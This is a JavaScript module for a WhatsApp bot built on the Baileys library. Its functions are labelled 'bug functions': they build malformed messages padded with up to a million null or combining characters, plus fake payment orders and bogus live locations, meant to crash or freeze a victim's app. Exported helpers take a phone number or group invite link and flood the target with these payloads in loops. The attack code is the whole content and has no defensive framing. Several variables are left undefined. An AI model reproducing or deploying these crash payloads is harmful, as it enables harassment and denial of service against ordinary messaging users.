//bug functions
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./69/xx1.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🦄드림 가이 Xeon`
}
}
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🦄드림 가이 Xeon",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/Wppj16p/cheemspic.jpg" } }, { upload: sock.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🦄드림 가이 Xeon"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await sock.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🦄드림 가이 Xeon"+" ".repeat(920000),
        'footerText': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'description': `🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await sock.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}


const sendReaction = async reactionContent => {
  sock.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   sock.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    sock.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await sock.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  sock.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  sock.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    xeonBugPay(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    freeze(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return sock.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return sock.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}

const fakeflow = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
'message': {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": bimg
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":45416739902,\"offset\":100},\"reference_id\":\"40NRXY65HS6\",\"type\":\"physical-goods\",\"order\":{\"status\":\"preparing_to_ship\",\"description\":\"\",\"subtotal\":{\"value\":29759959800,\"offset\":100},\"tax\":{\"value\":14805580001,\"offset\":100},\"discount\":{\"value\":148799799,\"offset\":100},\"shipping\":{\"value\":99999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7537631592926009\",\"product_id\":\"7538731592926009\",\"name\":\"${botname}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"${ownername}\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-2465f31c-4f49-46eb-9ad0-5ec5121a9c0d\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-13746d0a-55f0-4942-86b2-2094bc9a2978\",\"name\":\"\",\"amount\":{\"value\":99999800,\"offset\":100},\"quantity\":999999},{\"retailer_id\":\"custom-item-ab993749-045b-4f66-a1d3-264fe18fb1d0\",\"name\":\"\",\"amount\":{\"value\":99999900,\"offset\":100},\"quantity\":999999}]},\"additional_note\":\"\",\"native_payment_methods\":[]}`
}
]
}
}
}
};

const xeonimun = (texto) => {
sock.sendMessage(from, { text: texto, mentions: [sender]}, {quoted: m }).catch(e => {
return reply("Erro..")
})
}
 async function xeonBugPay(jid){
				await sock.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}


const subscribe_dgxeon = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `Paul's ur father`
}}
}
async function XeonyCrashy(dgxeon,chat) {
sock.sendMessage(chat, {
document: {url: './settings.js'},
mimetype: `image/null`,
fileName: `${dgxeon}.${xeontext1}` ,
caption: `${dgxeon + xeontext1}`,
}, {quoted: subscribe_dgxeon })
}
async function xeonIosShot(jid) {
    						for (let i = `3`; i !== 0; i -= 1) {
					const crasoh = await sock.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '🦄드림 가이 Xeon',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '🦄드림 가이 Xeon  🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
								title: '🦄드림 가이 Xeon',
								textArgb: 0xff000000,
								backgroundArgb: 0xffffffff,
								font: 1,
								previewType: 0,
								jpegThumbnail: await getBuffer('https://example.com/thumb.jpg'),
								contextInfo: {
								},
								doNotPlayInline: false,
								thumbnailDirectPath: 'https://example.com/thumb.jpg',
								thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
								thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
								mediaKey: Buffer.from(
									'abcdef1234567890abcdef1234567890',
									'hex'
								),
								mediaKeyTimestamp: Date.now(),
								thumbnailHeight: 200,
								thumbnailWidth: 200,
								inviteLinkGroupType: 0, // InviteLinkGroupType.DEFAULT
								inviteLinkParentGroupSubjectV2: 'Parent Group Subject',
								inviteLinkParentGroupThumbnailV2: Buffer.from(
									'abcdef1234567890',
									'hex'
								),
								inviteLinkGroupTypeV2: 0,
								viewOnce: true,
							},
						},
						{ participant: { jid: jid } }
					);
				}
	for (let i = `3`; i !== 0; i -= 1) {
       await sock.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"BRL","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"🦄드림 가이 Xeon","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				for (let i = `3`; i !== 0; i -= 1) {
					await sock.relayMessage(
						jid,
						{
							viewOnceMessage: {
								message: {
									interactiveMessage: {
										header: {
											title: '',
											subtitle: ' ',
										},
										body: {
											text: '🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon',
										},
										footer: {
											text: 'xp',
										},
										nativeFlowMessage: {
											buttons: [
												{
													name: 'cta_url',
													buttonParamsJson:
														"{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : '', merchant_url : '' }",
												},
											],
											messageParamsJson: '\0'.repeat(1000000),
										},
									},
								},
							},
						},
						{ participant: { jid: jid } }
					);
					}
				}

        async function balnkgc(jid){

          		const xeonimage = {
    title: "🦄드림 가이 Xeon; ",
    hasMediaAttachment: true,
    imageMessage: thumb.imageMessage
};

const xtext = {
    text: ''
};
          await sock.relayMessage(jid,
            {
              'viewOnceMessage': {
        'message': {
            'interactiveMessage': {
                'header': xeonimage,
                'body': xtext,
                'nativeFlowMessage': {
                    'buttons': [{
                        'name': "galaxy_message",
                        'buttonParamsJson': JSON.stringify({
                            'header': "🦄드림 가이 Xeon; ",
                            'body': "xxx",
                            'flow_action': "navigate",
                            'flow_action_payload': {
                                'screen': "FORM_SCREEN"
                            },
                            'flow_cta': "xxxxx",
                            'flow_id': "1169834181134583",
                            'flow_message_version': '3',
                            'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                    }],
                    'messageParamsJson': ''
                },
                'contextInfo': {
                    'isForwarded': true,
                    'fromMe': false,
                    'participant': "0@s.whatsapp.net",
                    'remoteJid': m.chat,
                    'quotedMessage': {
                        'documentMessage': {
                            'url': "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                            'mimetype': "application/pdf",
                            'title': "crash",
                            'pageCount': 0x3b9aca00,
                            'fileName': "crash.pdf",
                            'contactVcard': true
                        }
                    },
                    'forwardedNewsletterMessageInfo': {
                        'newsletterJid': "120363222395675670@newsletter",
                        'serverMessageId': 0x1,
                        'newsletterName': "🦄드림 가이 Xeon"
                    }
                }
            }
        }
    }

            }
          )
        }

        async function freeze(jid){
           for (let i = 0; i < 50; i++) {
await sock.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "🦄드림 가이 Xeon" + xeontext1,
    'mimetype': "application/zip",
    'caption': "🦄드림 가이 Xeon" + xeontext1,
    'pageCount': 0x3b9aca00,
    'contactVcard': true
});
}
        }

//end bug functions










export async function sendBulkMessages(sock, number) {
  let phoneNumber = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  let cleanedNumber = phoneNumber.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  
  var contactInfo = await sock.onWhatsApp(whatsappNumber);
  
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500);
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500);
  sendRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500);
  await sleep(2500);
  await xeonIosShot(whatsappNumber);
}

export async function delayedMessageSender(sock, number) {
}

export async function freezeDelayHandler(sock, jid) {
  let xeonyvictim = jid.replace(/[^0-9]/g, "")
  let target = xeonyvictim + '@s.whatsapp.net'
  for (let j = 0; j < 1; j++) {
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
await xeonkillpic(target, oneclickxeon)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
}
}

export async function sendPaymentRequest(sock, number) {
  let phoneNumber = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  let cleanedNumber = phoneNumber.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await sock.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
}

export async function sendGroupMessages(sock, jid) {
  let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
  try {
    let messageCount = text.split(" ")[1] ? text.split(" ")[1] : '1';
    let groupTarget = await sock.groupAcceptInvite(groupLink);
    await sleep(2000);
    sendViewOnceMessages(groupTarget, messageCount);
    balnkgc(groupTarget)
    await sleep(2500);
  } catch (error) {
    console.error("Error joining group or sending messages:", error);
  }
}